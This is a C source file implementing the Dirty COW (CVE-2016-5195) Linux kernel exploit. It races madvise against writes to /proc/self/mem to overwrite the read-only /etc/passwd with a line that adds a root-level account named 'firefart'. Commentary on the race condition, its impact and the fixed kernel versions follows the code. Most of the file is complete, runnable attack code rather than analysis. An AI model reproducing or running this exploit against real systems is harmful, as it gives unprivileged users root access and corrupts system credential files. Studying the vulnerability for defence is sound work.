#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

/*
 * Dirty COW (CVE-2016-5195) Exploit Implementation
 * 
 * This exploit leverages a race condition in the Linux kernel's 
 * Copy-On-Write (COW) mechanism to gain unauthorized write access
 * to read-only memory mappings.
 *
 * The vulnerability exists in the kernel's memory subsystem where
 * a race condition between madvise(MADV_DONTNEED) and writes through
 * /proc/self/mem can break the COW protection.
 */

// Target file to exploit - absolute path
#define TARGET_FILE "/etc/passwd"

// Payload to write into the target file
#define PAYLOAD_STRING "firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash"

void *map;
int f;
struct stat st;
char *payload = PAYLOAD_STRING;
char *target_path = TARGET_FILE;

/*
 * Thread 1: madvise thread
 * Continuously calls madvise with MADV_DONTNEED to discard pages
 * from memory, forcing the kernel to reload them. This creates
 * the race condition window.
 */
void *madviseThread(void *arg) {
    int i, c = 0;
    for(i = 0; i < 200000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("madvise %d\n\n", c);
    return NULL;
}

/*
 * Thread 2: procselfmem thread
 * Continuously attempts to write payload through /proc/self/mem
 * During the race condition window, this write can succeed on
 * the original read-only file instead of the COW copy.
 */
void *procselfmemThread(void *arg) {
    char *str = (char*)arg;
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    
    if(f == -1) {
        perror("open /proc/self/mem");
        return NULL;
    }
    
    for(i = 0; i < 200000000; i++) {
        // Seek to the memory mapped location
        lseek(f, (uintptr_t) map, SEEK_SET);
        // Write our payload - exploiting the race condition
        c += write(f, str, strlen(str));
    }
    
    printf("procselfmem %d\n\n", c);
    close(f);
    return NULL;
}

/*
 * Main exploit function
 * Sets up memory mapping and spawns racing threads
 */
int main(int argc, char *argv[]) {
    pthread_t pth1, pth2;
    
    printf("Dirty COW (CVE-2016-5195) Exploit\n");
    printf("==================================\n");
    printf("Target: %s\n", target_path);
    printf("Payload: %s\n\n", payload);
    
    // Open target file as read-only
    f = open(target_path, O_RDONLY);
    if(f == -1) {
        perror("open target file");
        exit(1);
    }
    
    // Get file statistics
    fstat(f, &st);
    
    /*
     * Map the target file into memory as PRIVATE and READ-only
     * MAP_PRIVATE means changes should be copy-on-write
     * This is the key to the exploit - we'll break this protection
     */
    map = mmap(NULL, st.st_size + strlen(payload), PROT_READ, MAP_PRIVATE, f, 0);
    if(map == MAP_FAILED) {
        perror("mmap");
        close(f);
        exit(1);
    }
    
    printf("Memory mapped at address: %p\n", map);
    printf("File size: %ld bytes\n", st.st_size);
    printf("Starting exploit threads...\n\n");
    
    /*
     * Launch both threads simultaneously to create race condition
     * Thread 1: Continuously calls madvise(MADV_DONTNEED)
     * Thread 2: Continuously writes through /proc/self/mem
     * 
     * The race window occurs when:
     * 1. madvise discards the page
     * 2. Before COW triggers, write goes through /proc/self/mem
     * 3. Kernel writes to original file instead of COW copy
     */
    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, procselfmemThread, payload);
    
    // Wait for threads to complete
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    
    printf("Exploit completed!\n");
    printf("Check if %s was modified\n", target_path);
    
    // Cleanup
    munmap(map, st.st_size + strlen(payload));
    close(f);
    
    return 0;
}

/*
 * Technical Details:
 * 
 * The Dirty COW vulnerability (CVE-2016-5195) is a privilege escalation
 * vulnerability in the Linux kernel's memory subsystem, specifically in
 * the handling of copy-on-write (COW) during a page fault.
 *
 * Normal COW behavior:
 * - When a process maps a file as MAP_PRIVATE and attempts to write,
 *   the kernel creates a private copy of that page
 * - The original file remains unchanged
 *
 * The vulnerability:
 * - A race condition exists between get_user_pages() and page fault handling
 * - madvise(MADV_DONTNEED) can discard mapped pages from memory
 * - Writing through /proc/self/mem triggers get_user_pages()
 * - If timed correctly, the write can occur on the original page
 *   before COW protection is applied
 *
 * Impact:
 * - Unprivileged users can gain write access to read-only files
 * - Can be used to modify /etc/passwd, SUID binaries, etc.
 * - Full system compromise possible
 *
 * Affected kernel versions:
 * - Linux kernel >= 2.6.22 (introduced in 2007)
 * - Fixed in kernel versions 4.8.3, 4.7.9, 4.4.26, and others (October 2016)
 */